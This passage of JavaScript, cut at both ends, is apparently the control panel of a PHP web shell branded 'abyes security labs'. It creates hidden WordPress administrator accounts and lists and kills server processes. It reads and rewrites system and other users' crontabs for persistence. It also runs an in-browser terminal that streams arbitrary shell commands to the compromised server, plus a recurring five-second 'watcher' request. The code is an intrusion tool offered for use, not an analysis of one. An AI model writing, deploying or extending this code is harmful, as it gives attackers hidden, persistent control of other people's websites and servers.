    var email = document.getElementById('wpNewEmail').value.trim();
    var hide = document.getElementById('wpHideUser').checked;
    if (!user || !pass) { wpShowStatus('Username and password required.', 'err'); return; }
    var data = {c4t: 'cadm', xun: user, xpw: pass, xem: email};
    if (hide) data.hide_user = '1';
    wpShowStatus('Creating...', 'ok');
    wpRequest(data, function(r) {
        if (r.ok) {
            var msg = 'Admin "' + r.u + '" created. Pass: ' + r.p;
            if (r.hide) msg += ' (Hidden)';
            wpShowStatus(msg, 'ok');
            document.getElementById('wpNewUser').value = '';
            document.getElementById('wpNewPass').value = '';
            document.getElementById('wpNewEmail').value = '';
            document.getElementById('wpHideUser').checked = false;
            wpLoadUsers();
        } else {
            wpShowStatus('Error: ' + (r.err || 'unknown'), 'err');
        }
    });
}

function wpShowStatus(msg, type) {
    var el = document.getElementById('wpCreateStatus');
    el.style.display = 'block';
    el.textContent = msg;
    el.style.background = type === 'ok' ? 'rgba(63,185,80,0.1)' : 'rgba(248,81,73,0.1)';
    el.style.border = '1px solid ' + (type === 'ok' ? '#3fb950' : '#f85149');
    el.style.color = type === 'ok' ? '#3fb950' : '#f85149';
    if (type === 'ok' && msg !== 'Creating...') {
        setTimeout(function(){ el.style.display = 'none'; }, 8000);
    }
}


var procData = null;
var procTimer = null;
var procPaused = false;
var procKillTarget = null;
var procCurrentUser = '<?php echo get_current_user(); ?>';

function procRequest(data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', _LPSELF, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        try { callback(JSON.parse(xhr.responseText)); }
        catch(e) { callback({err: 'Parse error: ' + xhr.responseText.substring(0, 300)}); }
    };
    xhr.onerror = function() { callback({err: 'Network error'}); };
    var params = ['_xk=labs'];
    for (var key in data) params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    xhr.send(params.join('&'));
}

function procStart() {
    procPaused = false;
    var btn = document.getElementById('procPauseBtn');
    if (btn) btn.textContent = 'Pause';
    procLoad();
    if (procTimer) clearInterval(procTimer);
    procTimer = setInterval(function() {
        if (!procPaused) procLoad();
    }, 3000);
}

function procStopAndClose() {
    if (procTimer) { clearInterval(procTimer); procTimer = null; }
    hideModal('proc');
}

function procTogglePause() {
    procPaused = !procPaused;
    var btn = document.getElementById('procPauseBtn');
    btn.textContent = procPaused ? 'Resume' : 'Pause';
    var indicator = document.getElementById('procLiveIndicator');
    indicator.style.background = procPaused ? '#f97316' : '#3fb950';
    indicator.style.animation = procPaused ? 'none' : 'procPulse 1s infinite';
}

function procLoad() {
    procRequest({proc_action: 'list'}, function(r) {
        if (r.err) {
            document.getElementById('procTableBody').innerHTML = '<tr><td colspan="8" style="text-align:center;padding:20px;color:#f85149;">' + r.err + '</td></tr>';
            return;
        }
        procData = r;
        document.getElementById('procStats').textContent = r.total + ' processes | ' + r.total_hidden + ' hidden | ' + r.total_recent + ' recent';
        var alerts = document.getElementById('procAlerts');
        var alertHtml = '';
        if (r.total_hidden > 0) {
            alertHtml += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(248,81,73,0.15);border:1px solid #f85149;color:#f85149;padding:3px 10px;border-radius:4px;font-size:10px;font-weight:600;">';
            alertHtml += '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>';
            alertHtml += r.total_hidden + ' HIDDEN PROCESS DETECTED</span>';
        }
        if (r.total_recent > 0) {
            alertHtml += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(63,185,80,0.15);border:1px solid #3fb950;color:#3fb950;padding:3px 10px;border-radius:4px;font-size:10px;font-weight:600;">';
            alertHtml += '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>';
            alertHtml += r.total_recent + ' recently started (&lt;5min)</span>';
        }
        alerts.innerHTML = alertHtml;
        procFilterRender();
    });
}

function procFilterRender() {
    if (!procData) return;
    var search = (document.getElementById('procSearch').value || '').toLowerCase();
    var filter = document.getElementById('procFilter').value;
    var sort = document.getElementById('procSort').value;

    var list = [];

    if (filter === 'all' || filter === 'hidden') {
        (procData.hidden || []).forEach(function(h) {
            list.push({
                pid: h.pid, user: h.user, cpu: '?', mem: '?', vsz: '?', rss: '?',
                tty: '?', stat: '?', start: '?', time: '?', command: h.command,
                _type: 'hidden'
            });
        });
    }

    var recentPids = {};
    (procData.recent || []).forEach(function(r) { recentPids[r.pid] = r.age_seconds; });

    var procs = procData.processes || [];
    procs.forEach(function(p) {
        var type = 'normal';
        if (recentPids[p.pid] !== undefined) type = 'recent';
        if (filter === 'hidden') return;
        if (filter === 'mine' && p.user !== procCurrentUser) return;
        if (filter === 'recent' && type !== 'recent') return;
        p._type = type;
        if (type === 'recent') p._age = recentPids[p.pid];
        list.push(p);
    });

    if (search) {
        list = list.filter(function(p) {
            return (p.pid + ' ' + p.user + ' ' + p.command + ' ' + p.stat).toLowerCase().indexOf(search) >= 0;
        });
    }

    list.sort(function(a, b) {
        if (a._type === 'hidden' && b._type !== 'hidden') return -1;
        if (b._type === 'hidden' && a._type !== 'hidden') return 1;
        if (sort === 'cpu') return parseFloat(b.cpu || 0) - parseFloat(a.cpu || 0);
        if (sort === 'mem') return parseFloat(b.mem || 0) - parseFloat(a.mem || 0);
        if (sort === 'pid') return parseInt(b.pid || 0) - parseInt(a.pid || 0);
        if (sort === 'start') return 0;
        return 0;
    });

    var html = '';
    if (list.length === 0) {
        html = '<tr><td colspan="8" style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">No matching processes.</td></tr>';
    }
    list.forEach(function(p) {
        var rowClass = 'proc-row';
        var badge = '';
        if (p._type === 'hidden') {
            rowClass += ' proc-hidden';
            badge = '<span style="background:#f85149;color:#fff;padding:1px 5px;border-radius:3px;font-size:8px;font-weight:700;margin-left:4px;">HIDDEN</span>';
        } else if (p._type === 'recent') {
            rowClass += ' proc-recent';
            var ageStr = p._age !== undefined ? p._age + 's ago' : 'new';
            badge = '<span style="background:#3fb950;color:#000;padding:1px 5px;border-radius:3px;font-size:8px;font-weight:700;margin-left:4px;">NEW ' + ageStr + '</span>';
        }

        var cpuClass = parseFloat(p.cpu) > 50 ? ' proc-high-cpu' : '';
        var memClass = parseFloat(p.mem) > 50 ? ' proc-high-mem' : '';

        var cmdShort = (p.command || '').length > 80 ? p.command.substring(0, 80) + '...' : (p.command || '');
        var cmdEsc = cmdShort.replace(/</g, '&lt;').replace(/>/g, '&gt;');
        var cmdFullEsc = (p.command || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');

        html += '<tr class="' + rowClass + '" style="border-bottom:1px solid var(--border);">';
        html += '<td style="padding:5px 8px;color:#ec4899;font-family:monospace;font-weight:600;white-space:nowrap;">' + p.pid + '</td>';
        html += '<td style="padding:5px 8px;color:var(--text-muted);white-space:nowrap;">' + (p.user || '?') + '</td>';
        html += '<td style="padding:5px 8px;text-align:right;font-family:monospace;white-space:nowrap;" class="' + cpuClass + '">' + (p.cpu || '?') + '</td>';
        html += '<td style="padding:5px 8px;text-align:right;font-family:monospace;white-space:nowrap;" class="' + memClass + '">' + (p.mem || '?') + '</td>';
        html += '<td style="padding:5px 8px;color:var(--text-muted);font-family:monospace;white-space:nowrap;">' + (p.stat || '?') + '</td>';
        html += '<td style="padding:5px 8px;color:var(--text-muted);white-space:nowrap;">' + (p.start || '?') + '</td>';
        html += '<td style="padding:5px 8px;color:var(--text-primary);font-family:monospace;font-size:10px;" title="' + cmdFullEsc + '">' + cmdEsc + badge + '</td>';
        html += '<td style="padding:5px 8px;text-align:center;white-space:nowrap;">';
        if (p.pid && p.pid !== '?') {
            html += '<button class="btn btn-sm btn-danger" style="padding:2px 8px;font-size:9px;" onclick="procKill(' + p.pid + ',\'' + cmdShort.replace(/'/g, "\\'").replace(/"/g, '&quot;') + '\')">Kill</button>';
        }
        html += '</td>';
        html += '</tr>';
    });

    document.getElementById('procTableBody').innerHTML = html;
}

function procKill(pid, cmd) {
    procKillTarget = pid;
    document.getElementById('procKillPid').textContent = '#' + pid;
    document.getElementById('procKillCmd').textContent = cmd;
    showModal('procKill');
}

function procDoKill(sig) {
    if (!procKillTarget) return;
    var killedPid = procKillTarget;
    procRequest({proc_action: 'kill', pid: procKillTarget, signal: sig}, function(r) {
        hideModal('procKill');
        if (r.ok) {
            showToast('Signal <b>-' + sig + '</b> sent to PID <b>' + killedPid + '</b>', 'success', 4000, 'applepay');
        } else {
            showToast('Failed to kill PID ' + killedPid + ': ' + (r.err || ''), 'error');
            playFailSound();
        }
        procKillTarget = null;
        if (!procPaused) procLoad();
    });
}


var cronData = null;
var cronTimer = null;
var cronPaused = false;
var cronCurrentTab = 'user';
var cronRawVisible = false;

function cronRequest(data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', _LPSELF, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        try { callback(JSON.parse(xhr.responseText)); }
        catch(e) { callback({err: 'Parse error: ' + xhr.responseText.substring(0, 200)}); }
    };
    xhr.onerror = function() { callback({err: 'Network error'}); };
    var params = ['_xk=labs'];
    for (var key in data) params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    xhr.send(params.join('&'));
}

function cronStart() {
    cronPaused = false;
    document.getElementById('cronPauseBtn').textContent = 'Pause';
    cronLoad();
    if (cronTimer) clearInterval(cronTimer);
    cronTimer = setInterval(function() {
        if (!cronPaused) cronLoad();
    }, 5000);
}

function cronStopAndClose() {
    if (cronTimer) { clearInterval(cronTimer); cronTimer = null; }
    hideModal('cron');
}

function cronTogglePause() {
    cronPaused = !cronPaused;
    document.getElementById('cronPauseBtn').textContent = cronPaused ? 'Resume' : 'Pause';
    document.getElementById('cronLiveIndicator').style.background = cronPaused ? '#f97316' : '#3fb950';
    document.getElementById('cronLiveIndicator').style.animation = cronPaused ? 'none' : 'cronPulse 1s infinite';
}

function cronLoad() {
    cronRequest({cron_action: 'list'}, function(r) {
        if (r.err) {
            document.getElementById('cronUserBody').innerHTML = '<tr><td colspan="5" style="text-align:center;padding:20px;color:#f85149;">' + r.err + '</td></tr>';
            return;
        }
        cronData = r;
        var active = 0, disabled = 0;
        (r.user_crons || []).forEach(function(c) {
            if (!c.is_var && !c.is_comment) active++;
            else if (c.is_comment && c.schedule) disabled++;
        });
        document.getElementById('cronStats').textContent = 'User: ' + r.current_user + ' | ' + active + ' active | ' + disabled + ' disabled | sys: ' + (r.sys_crons || []).length;
        cronRenderUser();
        cronRenderSys();
        cronRenderOther();
        document.getElementById('cronEtcContent').textContent = r.etc_crontab || '[not readable]';
    });
}

function cronRenderUser() {
    if (!cronData) return;
    var crons = cronData.user_crons || [];
    if (crons.length === 0) {
        document.getElementById('cronUserBody').innerHTML = '<tr><td colspan="5" style="text-align:center;padding:30px;color:var(--text-muted);font-size:11px;">No crontab entries. Add one above.</td></tr>';
        return;
    }
    var html = '';
    crons.forEach(function(c, i) {
        var rowClass = 'cron-row';
        if (!c.enabled) rowClass += ' cron-disabled';
        if (c.is_var) rowClass += ' cron-var';
        var statusBadge = '';
        if (c.is_var) {
            statusBadge = '<span style="background:#f97316;color:#fff;padding:1px 6px;border-radius:3px;font-size:8px;">VAR</span>';
        } else if (!c.enabled && c.schedule) {
            statusBadge = '<span style="background:#6b7280;color:#fff;padding:1px 6px;border-radius:3px;font-size:8px;">OFF</span>';
        } else if (c.enabled && c.schedule) {
            statusBadge = '<span style="background:#3fb950;color:#000;padding:1px 6px;border-radius:3px;font-size:8px;">ON</span>';
        } else if (c.is_comment) {
            statusBadge = '<span style="background:#4b5563;color:#fff;padding:1px 6px;border-radius:3px;font-size:8px;">NOTE</span>';
        }
        var schedDisp = c.schedule ? ('<code style="background:rgba(6,182,212,0.15);color:#06b6d4;padding:2px 6px;border-radius:3px;font-size:10px;">' + esc(c.schedule) + '</code>') : '<span style="color:var(--text-muted);">-</span>';
        var humanSchedule = cronHumanize(c.schedule);
        if (humanSchedule) schedDisp += '<br><span style="font-size:9px;color:var(--text-muted);">' + humanSchedule + '</span>';
        var cmdEsc = esc(c.command || c.raw);
        var cmdShort = cmdEsc.length > 80 ? cmdEsc.substring(0, 80) + '...' : cmdEsc;
        html += '<tr class="' + rowClass + '" style="border-bottom:1px solid var(--border);">';
        html += '<td style="padding:5px 8px;text-align:center;color:var(--text-muted);font-size:10px;">' + (i + 1) + '</td>';
        html += '<td style="padding:5px 8px;white-space:nowrap;">' + statusBadge + '</td>';
        html += '<td style="padding:5px 8px;">' + schedDisp + '</td>';
        html += '<td style="padding:5px 8px;font-family:monospace;font-size:10px;color:var(--text-primary);" title="' + cmdEsc + '">' + cmdShort + '</td>';
        html += '<td style="padding:5px 8px;text-align:center;white-space:nowrap;">';
        if (c.schedule && !c.is_var) {
            var toggleLabel = c.enabled ? 'Disable' : 'Enable';
            var toggleColor = c.enabled ? '#f97316' : '#3fb950';
            html += '<button class="btn btn-sm" style="padding:2px 6px;font-size:9px;background:' + toggleColor + ';border-color:' + toggleColor + ';color:#fff;margin-right:3px;" onclick="cronToggle(' + i + ')">' + toggleLabel + '</button>';
        }
        html += '<button class="btn btn-sm btn-danger" style="padding:2px 6px;font-size:9px;" onclick="cronDelete(' + i + ')">Del</button>';
        html += '</td></tr>';
    });
    document.getElementById('cronUserBody').innerHTML = html;
}

function cronRenderSys() {
    if (!cronData) return;
    var sys = cronData.sys_crons || [];
    if (sys.length === 0) {
        document.getElementById('cronSysBody').innerHTML = '<tr><td colspan="4" style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">No system cron files found or not readable.</td></tr>';
        return;
    }
    var html = '';
    sys.forEach(function(s) {
        var contentShort = s.content.length > 120 ? s.content.substring(0, 120) + '...' : s.content;
        html += '<tr class="cron-row" style="border-bottom:1px solid var(--border);">';
        html += '<td style="padding:5px 8px;white-space:nowrap;"><span style="background:rgba(6,182,212,0.15);color:#06b6d4;padding:1px 6px;border-radius:3px;font-size:9px;">' + esc(s.dir) + '</span></td>';
        html += '<td style="padding:5px 8px;font-family:monospace;font-size:10px;color:#06b6d4;">' + esc(s.name) + '</td>';
        html += '<td style="padding:5px 8px;font-family:monospace;font-size:9px;color:var(--text-muted);white-space:pre-wrap;word-break:break-all;" title="' + esc(s.content) + '">' + esc(contentShort) + '</td>';
        html += '<td style="padding:5px 8px;text-align:center;">' + (s.writable ? '<span style="color:#3fb950;">Yes</span>' : '<span style="color:#f85149;">No</span>') + '</td>';
        html += '</tr>';
    });
    document.getElementById('cronSysBody').innerHTML = html;
}

function cronRenderOther() {
    if (!cronData) return;
    var others = cronData.other_users || [];
    if (others.length === 0) {
        document.getElementById('cronOtherBody').innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">No other user crontabs found or not readable.</div>';
        return;
    }
    var html = '';
    others.forEach(function(o) {
        html += '<div style="margin-bottom:10px;border:1px solid var(--border);border-radius:6px;overflow:hidden;">';
        html += '<div style="background:var(--bg-secondary);padding:6px 10px;font-size:11px;font-weight:600;color:#06b6d4;border-bottom:1px solid var(--border);">' + esc(o.user) + '</div>';
        html += '<pre style="padding:8px;font-size:10px;color:var(--text-primary);margin:0;white-space:pre-wrap;word-break:break-all;">' + esc(o.content) + '</pre>';
        html += '</div>';
    });
    document.getElementById('cronOtherBody').innerHTML = html;
}

function cronSwitchTab(tab) {
    cronCurrentTab = tab;
    ['user', 'sys', 'other'].forEach(function(t) {
        document.getElementById('cronTab' + t.charAt(0).toUpperCase() + t.slice(1)).style.borderColor = (t === tab) ? '#06b6d4' : '';
        document.getElementById('cronTab' + t.charAt(0).toUpperCase() + t.slice(1)).style.color = (t === tab) ? '#06b6d4' : '';
        var el = document.getElementById('cron' + t.charAt(0).toUpperCase() + t.slice(1) + 'Tab');
        if (el) el.style.display = (t === tab) ? '' : 'none';
    });
    document.getElementById('cronEtcSection').style.display = (tab === 'sys') ? '' : 'none';
}

function cronApplyPreset() {
    var v = document.getElementById('cronPreset').value;
    if (v) document.getElementById('cronSchedule').value = v;
    document.getElementById('cronPreset').selectedIndex = 0;
}

function cronAdd() {
    var schedule = document.getElementById('cronSchedule').value.trim();
    var command = document.getElementById('cronCommand').value.trim();
    if (!schedule || !command) { showToast('Schedule and command are required', 'warning'); return; }
    cronRequest({cron_action: 'add', schedule: schedule, command: command}, function(r) {
        if (r.err) { showToast('Add cron failed: ' + r.err, 'error'); playFailSound(); return; }
        showToast('Cronjob added: <b>' + schedule + '</b>', 'success', 4000, 'applepay');
        document.getElementById('cronSchedule').value = '';
        document.getElementById('cronCommand').value = '';
        cronLoad();
    });
}

function cronToggle(idx) {
    cronRequest({cron_action: 'toggle', idx: idx}, function(r) {
        if (r.err) { showToast('Toggle failed: ' + r.err, 'error'); playFailSound(); return; }
        showToast('Cronjob toggled successfully', 'success', 4000, 'applepay');
        cronLoad();
    });
}

function cronDelete(idx) {
    showConfirm({
        title: 'Hapus Cronjob',
        msg:   'Yakin ingin menghapus entri cronjob ini?',
        warn:  'Cronjob akan dihapus permanen dari crontab.',
        color: '#f85149', colorAlpha: 'rgba(248,81,73,',
        icon:  '<rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="8" y1="12" x2="16" y2="12"/>',
        okIcon:'<polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/>',
        okLabel: 'Hapus',
        onOk: function() {
    cronRequest({cron_action: 'delete', idx: idx}, function(r) {
        if (r.err) { showToast('Delete cron failed: ' + r.err, 'error'); playFailSound(); return; }
        showToast('Cronjob entry deleted', 'success', 4000, 'applepay');
        cronLoad();
    });
        }
    });
}

function cronToggleRaw() {
    cronRawVisible = !cronRawVisible;
    document.getElementById('cronRawEditor').style.display = cronRawVisible ? '' : 'none';
    if (cronRawVisible && cronData) {
        document.getElementById('cronRawText').value = cronData.raw || '';
    }
}

function cronSaveRaw() {
    var raw = document.getElementById('cronRawText').value;
    cronRequest({cron_action: 'save_raw', raw: raw}, function(r) {
        if (r.err) { showToast('Save crontab failed: ' + r.err, 'error'); playFailSound(); return; }
        showToast('Crontab saved successfully', 'success', 4000, 'applepay');
        cronRawVisible = false;
        document.getElementById('cronRawEditor').style.display = 'none';
        cronLoad();
    });
}

function cronHumanize(schedule) {
    if (!schedule) return '';
    var map = {
        '* * * * *': 'Every minute', '*/5 * * * *': 'Every 5 minutes', '*/10 * * * *': 'Every 10 minutes',
        '*/15 * * * *': 'Every 15 minutes', '*/30 * * * *': 'Every 30 minutes', '0 * * * *': 'Every hour',
        '0 */2 * * *': 'Every 2 hours', '0 */6 * * *': 'Every 6 hours', '0 */12 * * *': 'Every 12 hours',
        '0 0 * * *': 'Daily at midnight', '0 0 * * 0': 'Weekly on Sunday', '0 0 * * 1': 'Weekly on Monday',
        '0 0 1 * *': 'Monthly on the 1st', '@reboot': 'On reboot', '@yearly': 'Once a year',
        '@annually': 'Once a year', '@monthly': 'Once a month', '@weekly': 'Once a week',
        '@daily': 'Once a day', '@hourly': 'Once an hour',
    };
    return map[schedule] || '';
}

function esc(s) {
    if (!s) return '';
    var d = document.createElement('div');
    d.appendChild(document.createTextNode(s));
    return d.innerHTML;
}


(function() {
   

    var chars = [];
    var COUNT = 5;

    function rand(min, max) { return Math.random() * (max - min) + min; }
    function updateChars() {
        var W = window.innerWidth - 48;
        var H = window.innerHeight - 48;

        for (var i = 0; i < chars.length; i++) {
            var c = chars[i];
            c.timer++;

            if (c.timer >= c.changeDir) {
                c.timer = 0;
                c.changeDir = rand(100, 350);
                c.targetX = rand(0, W);
                c.targetY = rand(0, H);
                var dx = c.targetX - c.x;
                var dy = c.targetY - c.y;
                var dist = Math.sqrt(dx * dx + dy * dy) || 1;
                var speed = rand(0.4, 1.2);
                c.vx = (dx / dist) * speed;
                c.vy = (dy / dist) * speed;
                c.el.style.transform = c.vx > 0 ? 'scaleX(1)' : 'scaleX(-1)';
            }

            c.x += c.vx;
            c.y += c.vy;

            if (c.x < 0) { c.x = 0; c.vx = Math.abs(c.vx); c.el.style.transform = 'scaleX(1)'; }
            if (c.x > W) { c.x = W; c.vx = -Math.abs(c.vx); c.el.style.transform = 'scaleX(-1)'; }
            if (c.y < 0) { c.y = 0; c.vy = Math.abs(c.vy); }
            if (c.y > H) { c.y = H; c.vy = -Math.abs(c.vy); }

            c.el.style.left = c.x + 'px';
            c.el.style.top = c.y + 'px';
        }

        requestAnimationFrame(updateChars);
    }

    for (var i = 0; i < COUNT; i++) {
        spawnChar(i);
    }
    requestAnimationFrame(updateChars);
})();
(function() {
    var TICK_SELF = window.location.pathname;
    var TICK_BODY = '_xk=labs&lock_action=lp_watcher_tick';

    function doTick() {
        var x = new XMLHttpRequest();
        x.open('POST', TICK_SELF, true);
        x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        x.onload = function() {
            try { JSON.parse(x.responseText); } catch(e) {}
        };
        x.onerror = function() {};
        x.send(TICK_BODY);
    }

    doTick();
    setInterval(doTick, 5000);
})();
(function() {
    var _T = null;
    var _cwd = window._currentDir || _LPDIR || '/';
    var _sid = '';
    var _history = [];
    var _histIdx = 0;
    var _running = false;
    var _promptLen = 0;
    var _promptBuf = '';
    var _abortCtrl = null;

    function _selfUrl() {
        return window._LPSELF || _LPSELF;
    }

    function _promptPlain() {
    var parts = _cwd.split('/').filter(Boolean);
    return '/' + parts.join('/') + ' $ ';
}
    function _setStatus(s) {
        var el = document.getElementById('termStatusBadge');
        var cwdEl = document.getElementById('termCwdDisplay');
        if (el) {
            var map = {READY:'#4ade80', RUNNING:'#f59e0b', ERROR:'#f85149'};
            el.textContent = s;
            el.style.color = map[s] || '#8b949e';
        }
        if (cwdEl) cwdEl.textContent = _cwd;
    }

    function _write(text) {
        if (!_T) return;
        _T.value += text;
        _T.scrollTop = _T.scrollHeight;
    }

    function _writePrompt() {
        var p = _promptPlain();
        _promptBuf = _T.value + p;
        _T.value = _promptBuf;
        _promptLen = _T.value.length;
        _T.scrollTop = _T.scrollHeight;
        _T.setSelectionRange(_T.value.length, _T.value.length);
        _T.focus();
    }

    function _replaceInput(newVal) {
        var base = _promptBuf.slice(0, _promptLen - _promptPlain().length) + _promptPlain();
        _T.value = base + newVal;
        _T.setSelectionRange(_T.value.length, _T.value.length);
    }

    function _getCurrentCmd() {
        return _T.value.slice(_promptLen);
    }

    function _sendCmd(cmd) {
        _running = true;
        _setStatus('EXECUTE');
        if (_abortCtrl) _abortCtrl.abort();
        _abortCtrl = new AbortController();

        var body = '_xk=labs&lock_action=terminal_stream2'
            + '&cmd=' + encodeURIComponent(cmd)
            + '&cwd=' + encodeURIComponent(_cwd)
            + '&sid=' + encodeURIComponent(_sid);

        fetch(_selfUrl(), {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: body,
            signal: _abortCtrl.signal
        })
        .then(function(resp) {
            var reader = resp.body.getReader();
            var decoder = new TextDecoder();
            var buf = '';
            function pump() {
                return reader.read().then(function(r) {
                    if (r.done) return;
                    buf += decoder.decode(r.value, {stream: true});
                    var lines = buf.split('\n');
                    buf = lines.pop();
                    var evtType = '';
                    lines.forEach(function(line) {
                        if (line.startsWith('event: ')) {
                            evtType = line.slice(7).trim();
                        } else if (line.startsWith('data: ')) {
                            try {
                                var d = JSON.parse(line.slice(6));
                                if (evtType === 'out' && typeof d.v === 'string') {
                                    _write(d.v.replace(/\r\n/g,'\n').replace(/\r/g,'\n'));
                                } else if (evtType === 'done') {
                                    if (d.cwd) _cwd = d.cwd;
                                    if (d.sid) _sid = d.sid;
                                }
                            } catch(ex) {}
                            evtType = '';
                        }
                    });
                    return pump();
                });
            }
            return pump();
        })
        .catch(function(e) {
            if (e.name !== 'AbortError') _write('\n[error: ' + e.message + ']');
        })
        .finally(function() {
            _running = false;
            _promptBuf = _T.value;
            _setStatus('READY');
            _writePrompt();
        });
    }

    function termClear() {
        if (!_T) return;
        _T.value = '';
        _promptBuf = '';
        _writePrompt();
    }
    window.termClear = termClear;

    function showTerminalModal() {
        var modal = document.getElementById('terminalModal');
        if (!modal) return;
        modal.classList.remove('hidden');
        if (!_T) {
            _T = document.getElementById('lpTerminal');
            _cwd = window._currentDir || _LPDIR || '/';
            _setStatus('READY');
            _write(`
█▀▀ █▀▀ █░░ █ █▀█ █▀ █▀▀   ▀█▀ █▀▀ █▀█ █▀▄▀█ █ █▄░█ ▄▀█ █░░
██▄ █▄▄ █▄▄ █ █▀▀ ▄█ ██▄   ░█░ ██▄ █▀▄ █░▀░█ █ █░▀█ █▀█ █▄▄
- abyes security labs
» NowMeee
\n`);
            _writePrompt();
            _T.addEventListener('keydown', function(e) {
                _T.scrollTop = _T.scrollHeight;
                var cur = _T.selectionStart;

                if ((e.ctrlKey || e.metaKey) && e.key === 'c') {
                    e.preventDefault();
                    if (_running && _abortCtrl) _abortCtrl.abort();
                    _write('^C\n');
                    _running = false;
                    _setStatus('READY');
                    _promptBuf = _T.value;
                    _writePrompt();
                    return;
                }
                if ((e.ctrlKey || e.metaKey) && e.key === 'l') {
                    e.preventDefault();
                    termClear();
                    return;
                }
                if (_running) { e.preventDefault(); return; }
                if (e.key === 'Home') {
                    e.preventDefault();
                    _T.setSelectionRange(_promptLen, _promptLen);
                    return;
                }
                if ((e.key === 'ArrowLeft' || e.key === 'Backspace') && cur <= _promptLen) {
                    e.preventDefault();
                    return;
                }
                if (cur < _promptLen && e.key !== 'ArrowRight' && e.key !== 'End' && e.key !== 'Copy') {
                    e.preventDefault();
                    _T.setSelectionRange(_T.value.length, _T.value.length);
                }
                if (e.key === 'ArrowUp') {
                    e.preventDefault();
                    _histIdx = Math.min(_histIdx + 1, _history.length);
                    _replaceInput(_history[_history.length - _histIdx] || '');
                    return;
                }
                if (e.key === 'ArrowDown') {
                    e.preventDefault();
                    _histIdx = Math.max(_histIdx - 1, 0);
                    _replaceInput(_histIdx > 0 ? (_history[_history.length - _histIdx] || '') : '');
                    return;
                }
                if (e.key === 'Tab') {
                    e.preventDefault();
                    var partial = _getCurrentCmd();
                    if (!partial) return;
                    var matches = _history.filter(function(h) { return h.indexOf(partial) === 0 && h !== partial; });
                    matches = matches.filter(function(v,i,a){ return a.indexOf(v)===i; });
                    if (matches.length === 1) {
                        _replaceInput(matches[0] + ' ');
                    } else if (matches.length > 1) {
                        _write('\n' + matches.join('  '));
                        _promptBuf = _T.value;
                        _writePrompt();
                        _replaceInput(partial);
                    }
                    return;
                }
                if (e.key === 'Enter') {
                    e.preventDefault();
                    var cmd = _getCurrentCmd().trim();
                    _T.value += '\n';
                    if (cmd === '') {
                        _promptBuf = _T.value;
                        _writePrompt();
                        return;
                    }
                    if (cmd === 'clear' || cmd === 'reset' || cmd === 'cls') { termClear(); return; }
                    if (cmd === 'history') {
                        _write(_history.map(function(h, i){ return '  ' + (i+1) + '  ' + h; }).join('\n') + '\n');
                        _promptBuf = _T.value;
                        _writePrompt();
                        return;
                    }
                    if (_history[_history.length - 1] !== cmd) _history.push(cmd);
                    _histIdx = 0;
                    _sendCmd(cmd);
                    return;
                }
            });
        } else {
            _T.focus();
        }
    }
    window.showTerminalModal = showTerminalModal;
})();

function lpCloseMobMenus() {
    document.querySelectorAll('.mob-action-menu.open').forEach(function(m) {
        m.classList.remove('open');
    });
    document.querySelectorAll('.mob-action-btn.active').forEach(function(b) {
        b.classList.remove('active');
    });
}
function lpToggleMobMenu(btn) {
    var wrap = btn.parentNode;
    var menu = wrap.querySelector('.mob-action-menu');
    var isOpen = menu.classList.contains('open');
    lpCloseMobMenus();
    if (!isOpen) {
        menu.classList.add('open');
        btn.classList.add('active');
        var rect = btn.getBoundingClientRect();
        var menuW = 180;
        var leftPos = rect.right - menuW;
        if (leftPos < 4) leftPos = 4;
        var topPos = rect.bottom + 4;
        if (topPos + 280 > window.innerHeight) topPos = rect.top - 284;
        menu.style.left = leftPos + 'px';
        menu.style.top  = topPos + 'px';
    }
}
document.addEventListener('click', function(e) {
    if (!e.target.closest || !e.target.closest('.mob-action-wrap')) lpCloseMobMenus();
});

function showComingSoon(featureName) {
    var existing = document.getElementById('comingSoonToast');
    if (existing) existing.remove();

    var toast = document.createElement('div');
    toast.id = 'comingSoonToast';
    toast.style.cssText = [
        'position:fixed;bottom:90px;left:50%;transform:translateX(-50%);z-index:999999;',
        'background:rgba(15,17,26,0.97);border:1px solid rgba(245,158,11,0.4);',
        'border-radius:10px;padding:10px 18px 10px 14px;',
        'display:flex;align-items:center;gap:10px;',
        'box-shadow:0 8px 32px rgba(0,0,0,0.6),0 0 0 1px rgba(245,158,11,0.1) inset;',
        'animation:fadeIn .2s ease;white-space:nowrap;',
    ].join('');

    toast.innerHTML = [
        '<div style="width:30px;height:30px;border-radius:8px;background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.3);display:flex;align-items:center;justify-content:center;flex-shrink:0;">',
        '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>',
        '</div>',
        '<div>',
        '<div style="font-size:12px;font-weight:600;color:#e2e8f0;">' + (featureName || 'Fitur ini') + ' &mdash; Coming Soon</div>',
